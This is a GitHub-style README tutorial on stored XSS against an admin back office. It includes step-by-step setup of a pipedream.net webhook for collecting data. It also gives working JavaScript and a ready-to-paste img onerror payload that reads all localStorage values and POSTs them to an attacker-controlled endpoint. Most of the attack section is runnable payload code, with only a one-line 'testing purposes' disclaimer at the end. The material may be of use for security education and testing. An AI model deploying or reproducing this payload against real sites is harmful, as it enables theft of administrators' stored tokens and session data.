<h1 align="center">XSS-attack-exposure</h1>
</br>

> `XSS-attack` vulnerability is one of the most popular `OWASP Top 10` vulnerabilities, and today we will observe how to get **Admin** side `localStorage` data using `XSS-attack` vulnerability issue
</br>

In our case, we have an input field and by clicking the `SUBMIT` button the entered data transfers to Backend, updates the corresponding table in the Database and then transfers to a BackOffice

</br>
</br>

<p align="center"><img src="https://github.com/da-vincis/XSS-attack-exposure/assets/139674525/198acd31-0097-4631-9a9f-c7c8404ae1ca"></p>


</br>

So in ideal case when we send any malicious script it should **not be** set in the Backend side as script and if it isn’t set as script it could not appear in the BackOffice as script and would not be executed.

</br>

To check for `XSS-attack` vulnerability we submit a simple `HTML` tag and set a non-existed src as a value for the `src` attribute and also we set a simple alert as a value for `onerror` attribute, so when we get an error for the non-existed src, the `script` in the onerror will be executed

</br>

<p align="center"><img src="https://github.com/da-vincis/XSS-attack-exposure/assets/139674525/ae4aacd5-fa62-4bf1-8c5b-e89741f63e96"></p>

</br>

As it is shown in the screenshot bellow the submitted `HTML` tag is set in the `HTML` of the Web site

</br>

<p align="center"><img src="https://github.com/da-vincis/XSS-attack-exposure/assets/139674525/0acfa37d-e055-487e-acb0-c01159d40eb0"></p>

</br>

It means that there is an **`XSS-attack`** vulnerability, and now that we know it let’s try to get `localStorage` data from the BackOffice. 

</br>

For getting `localStorage` data from the BackOffice, we need to develop a script that will get `localStorage` data and send it in the body of the `POST` request, and also we need some endpoint `URL` to request our call to that endpoint `URL`.

</br>

In our case we will be using `https://pipedream.com/` Web site because it has a great feature which name is `HTTP / Webhook`, it generates a unique endpoint `URL` and whenever a request is made to that endpoint `URL` we can see that request with all information provided.

</br>

_Below are shown the steps on how to create an endpoint `URL` in the `https://pipedream.com/` Web site, we observe the case in which the precondition is the already created account in that Web site_

</br>

> **Steps:**
> 1.	Open https://pipedream.com/ and log in
> 2.	Click "New" in the top-right side of the Web page
> 3.	Click "HTTP / Webhook" button
> 4.	Click for example "HTTP Requests with a Body"
> 5.	Choose "Event Data" ---> "Full HTTP request", "HTTP Response" ---> 'Return a custom response from your workflow'
> 6.	Click "Save and continue" button
> 7.	Copy the unique URL
> 8.	Past the unique URL in the URL section of the request
> 9.	Send any request to that URL

</br>

<p align="center"><img src="https://github.com/da-vincis/XSS-attack-exposure/assets/139674525/b1599a6a-43ea-4bd3-a686-afed67ca934f"></p>

</br>

We have created an endpoint `URL` so let’s develop a script to make a `POST` request to that `URL`.

</br>

We will be using `JavaScript` call back function which will include the `XMLHttpRequest` object for creating a `POST` request. 

_For creating a variable we will be using `var` declaration so we will know that any version of the browser will accept it_

</br>

_See the developed script for exposure in the `exposureAttack.js` file in the same repository_

</br>

#### Javascript　

``` javascript
(function() {
  var values = []; // creates an empty array, so the localStorage data will be set in it

  keys = Object.keys(localStorage); // gets all the keys of the data stored in the localStorage

  var i = keys.length; // assigns length of the keys to i varriable

  while(i--) { // as far as the loop is true, the keys.length is positive, the script in the loop will execute
 
  values.push(localStorage.getItem(keys[i]) ); // every time the loop is true we push values of the localStorage into created 'values' array

  }

// when the loop is executed and we have the array with data of localStorage, we need to make a POST request to our unique endpoint URL

  var xmlHttp = new XMLHttpRequest(); // creates a new XMLHttpRequest object and assigns it

  xmlHttp.open("POST","https://{unique data of the generated URL}.m.pipedream.net",false);

  xmlHttp.send(values); // We already have data of the localStorage, so we make POST request to our endpoint URL and send 'values' array in the body of the request, xmlHttp.send(values)

})(); // the () automatically calls the function

```

</br>

We have developed a function to get `localStorage` data and make a `POST` request to an endpoint `URL`,
now we need to put the developed function as a value of the **`onerror`** `HTML` attribute

</br>

#### HTML

```html
<img src='nonexistent-image.jpg' onerror='(function() { var values = []; keys = Object.keys(localStorage); i = keys.length; while(i--) { values.push(localStorage.getItem(keys[i]) ); }
var xmlHttp = new XMLHttpRequest(); xmlHttp.open("POST","https://eocze95suett51c.m.pipedream.net",false); xmlHttp.send(values);
})();'>


```

</br>

So now when the `img` HTML tag is submitted and whenever the submitted message is opened from the BackOffice the callback function in `onerror` attribute will be executed and we will get the `POST` request with `localStorage` data body in the `https://pipedream.com/` Web site

</br>

<p align="center"><img src="https://github.com/da-vincis/XSS-attack-exposure/assets/139674525/e7ab8b7d-23cd-40d3-9f43-d49a5897280e"></p>

</br>

_Now you know how to use XSS-attack vulnerability to get data from a localStorage_

</br>

<h3 align="center">Attention: Use the technique only for testing purposes, Cybercrimes are also crimes</h3>

</br>
